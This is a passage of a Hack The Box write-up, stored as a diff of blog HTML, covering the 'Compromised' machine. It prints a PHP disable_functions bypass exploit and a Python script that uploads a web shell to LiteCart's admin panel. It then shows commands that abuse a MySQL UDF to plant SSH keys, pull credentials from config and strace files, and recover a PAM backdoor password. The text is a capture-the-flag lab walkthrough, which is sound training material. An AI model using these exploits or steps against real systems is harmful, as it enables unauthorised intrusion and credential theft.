+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$elf</span> <span class="o">=</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't parse ELF header"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't get basic_functions address"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$zif_system</span> <span class="o">=</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't get zif_system address"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1"># fake closure object</span>
+    <span class="nv">$fake_obj_offset</span> <span class="o">=</span> <span class="mh">0xd0</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x110</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="nv">$fake_obj_offset</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">,</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$closure_obj</span><span class="p">,</span> <span class="nv">$i</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1"># pwn</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_obj_offset</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="c1"># internal func type</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span> <span class="c1"># internal func handler</span>
+
+    <span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">)(</span><span class="nv">$cmd</span><span class="p">);</span>
+
+    <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>and 45267.py</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+</pre></td> --><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">mechanize</span>
+<span class="kn">import</span> <span class="nn">cookielib</span>
+<span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'LiteCart'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'admin login page url - EX: https://IPADDRESS/admin/'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'admin password'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'admin username'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+<span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">u</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">t</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">p</span><span class="p">):</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"-h for help"</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">t</span>
+<span class="n">user</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">u</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">p</span>
+
+<span class="n">br</span> <span class="o">=</span> <span class="n">mechanize</span><span class="p">.</span><span class="n">Browser</span><span class="p">()</span>
+<span class="n">cookiejar</span> <span class="o">=</span> <span class="n">cookielib</span><span class="p">.</span><span class="n">LWPCookieJar</span><span class="p">()</span>
+<span class="n">br</span><span class="p">.</span><span class="n">set_cookiejar</span><span class="p">(</span> <span class="n">cookiejar</span> <span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">set_handle_equiv</span><span class="p">(</span> <span class="bp">True</span> <span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">set_handle_redirect</span><span class="p">(</span> <span class="bp">True</span> <span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">set_handle_referer</span><span class="p">(</span> <span class="bp">True</span> <span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">set_handle_robots</span><span class="p">(</span> <span class="bp">False</span> <span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">addheaders</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span> <span class="s">'User-agent'</span><span class="p">,</span> <span class="s">'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'</span> <span class="p">)</span> <span class="p">]</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">select_form</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"login_form"</span><span class="p">)</span>
+<span class="n">br</span><span class="p">[</span><span class="s">"username"</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span>
+<span class="n">br</span><span class="p">[</span><span class="s">"password"</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="n">submit</span><span class="p">()</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"?app=vqmods&amp;doc=vqmods"</span><span class="p">)</span>
+<span class="n">one</span><span class="o">=</span><span class="s">""</span>
+<span class="k">for</span> <span class="n">form</span> <span class="ow">in</span> <span class="n">br</span><span class="p">.</span><span class="n">forms</span><span class="p">():</span>
+    <span class="n">one</span><span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">form</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"("</span><span class="p">)</span>
+    <span class="n">one</span><span class="o">=</span> <span class="n">one</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)</span>
+    <span class="n">one</span><span class="o">=</span> <span class="n">one</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">")"</span><span class="p">)</span>
+    <span class="n">one</span> <span class="o">=</span> <span class="n">one</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="n">_ua_handlers</span><span class="p">[</span><span class="s">'_cookies'</span><span class="p">].</span><span class="n">cookiejar</span>
+<span class="n">cookie_dict</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cookies</span><span class="p">:</span>
+    <span class="n">cookie_dict</span><span class="p">[</span><span class="n">c</span><span class="p">.</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">value</span>
+<span class="n">bypass</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'bypass.php'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'vqmod'</span><span class="p">:</span> <span class="p">(</span><span class="s">"mybypass.php"</span><span class="p">,</span> <span class="n">bypass</span><span class="p">,</span> <span class="s">"application/xml"</span><span class="p">),</span>
+        <span class="s">'token'</span><span class="p">:</span><span class="n">one</span><span class="p">,</span>
+        <span class="s">'upload'</span><span class="p">:(</span><span class="bp">None</span><span class="p">,</span><span class="s">"Upload"</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"?app=vqmods&amp;doc=vqmods"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie_dict</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"../vqmod/xml/mybypass.php?c=id"</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Shell =&gt; "</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"../vqmod/xml/mybypass.php"</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Sorry something went wrong"</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<p>Letâ€™s run the exploit again</p>
+
+<p><img src="/assets/img/htb-machines/compromised/11.png" alt="Desktop View" /></p>
+
+<p>our shell is uploaded successfully</p>
+
+<p><img src="/assets/img/htb-machines/compromised/12.png" alt="Desktop View" /></p>
+
+<p>now we can execute commands on webserver as we have bypassed disablefunctions.</p>
+
+<p><img src="/assets/img/htb-machines/compromised/13.png" alt="Desktop View" /></p>
+
+<p>after enumerating through shell i found mysql creds.</p>
+
+<p><img src="/assets/img/htb-machines/compromised/14.png" alt="Desktop View" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>cat /var/www/html/shop/includes/config.inc.php
+
+DB_TYPE', 'mysql');
+  define('DB_SERVER', 'localhost');
+  define('DB_USERNAME', 'root');
+  define('DB_PASSWORD', 'changethis');
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>also mysql has a shell</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I have done something similar before this box so UDF(User Defined Functions ) can be used here <a href="https://mariadb.com/kb/en/mysqlfunc-table/">udf</a></p>
+
+<p><code class="language-plaintext highlighter-rouge">
+mysql -u root -pchangethis -e "select * from mysql.func;" 
+</code></p>
+
+<p><img src="/assets/img/htb-machines/compromised/15.png" alt="Desktop View" /></p>
+
+<p>exec_cmd is a UDF yeah so now we can execute commands</p>
+
+<p>as ssh is opened in box so we can put our ssh keys in mysql authorized keys!!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>mysql -u root -pchangethis -e "select exec_cmd('mkdir -p /var/lib/mysql/.ssh')" 
+mysql -u root -pchangethis -e "select exec_cmd('echo your keys &gt; /var/lib/mysql/.ssh/authorized_keys')"
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>also give <code class="language-plaintext highlighter-rouge">chmod 600</code> to your ssh key.
+600 mean that the owner has full read and write access to the file, while no other user can access the file
+successfully logged in through ssh as mysql</p>
+
+<p><img src="/assets/img/htb-machines/compromised/16.png" alt="Desktop View" /></p>
+
+<p>we have lot of files in myqsl home but strace-log.dat is intresting one. strace-log.dat is big we can try to grep random strings. we got password of sysadmin also sysadmin has shell.</p>
+
+<p><img src="/assets/img/htb-machines/compromised/17.png" alt="Desktop View" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">
+:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0`
+</code>
+<br />
+<code class="language-plaintext highlighter-rouge">
+sysadmin: 3*NLJE32I$Fe
+</code></p>
+
+<p>ssh on sysadmin 
+we got user</p>
+
+<p><img src="/assets/img/htb-machines/compromised/18.png" alt="Desktop View" /></p>
+
+<p><strong><span style="color:#ff5555">Root</span></strong></p>
+
+<hr />
+
+<p>i was stucked in root part so i got a hint from</p>
+
+<p>he told me to use the</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>find / -newermt "2020-07-14" ! -newermt "2020-09-16" -type f 2&gt;/dev/null 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>so i found many files but these two files are intresting and these both file have same name but one is hidden and another is not.</p>
+
+<p><img src="/assets/img/htb-machines/compromised/main5.png" alt="Desktop View" /></p>
+
+<p>i googled about unix pam so pam is pluggable authentication module (PAM) is a mechanism to integrate multiple low-level authentication schemes into a high-level application programming interface (API). Read More about <a href="https://en.wikipedia.org/wiki/Pluggable_authentication_module">PAM</a>
+while googling about more about i found a article on <a href="http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html">pam backdoor</a> this is just a article on creating  a backdoor pam. also from here i guessed that we need to reverse .so file<br />
+<br />
+now we need to reverse that  so first transfer pam_unix.so in your system
+<br />
+scp</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/htb-machines/compromised/19.png" alt="Desktop View" /></p>
+
+<p>i always use ghidra for reversing stuff</p>
+
+<p>lets open it in ghidra</p>
+
+<p><img src="/assets/img/htb-machines/compromised/20.png" alt="Desktop View" /></p>
+
+<p>/assets/img/htb-machines/compromised/</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>
+if (iVar2 == 0) {
+  backdoor._0_8_ = 0x4533557e656b6c7a;
+  backdoor._8_7_ = 0x2d326d3238766e;
+  local_40 = 0;
+  iVar2 = strcmp((char *)p,backdoor);
+  if (iVar2 != 0) {
+  iVar2 = _unix_verify_password(pamh,name,(char *)p,ctrl);
+ }
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>thats hex string</p>
+
+<p>we can reverse the strings using option in ghidra.</p>
+
+<p><img src="/assets/img/htb-machines/compromised/21.png" alt="Desktop View" /></p>
+
+<p>convert both string into char sequence</p>
+
+<p>so strings will be</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>"zlke~U3E"
+"nv82m2-\x00"
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><br /></p>
+
+<p>our password will be -:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>zlke~U3Env82m2-
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><br />
+lets try this password for root</p>
+
+<p><img src="/assets/img/htb-machines/compromised/22.png" alt="Desktop View" /></p>
+
+<p>this box was really good learned a lot.</p>
+
+<p>ps -: Ignore my screenshots; both are from different machines. I couldnâ€™t recover much data, so I solved this box two times. if you have any query message me on my <a href="https://twitter.com/softwareuser_">Twitter</a>.</p>
+
+<hr />
+
+:ET
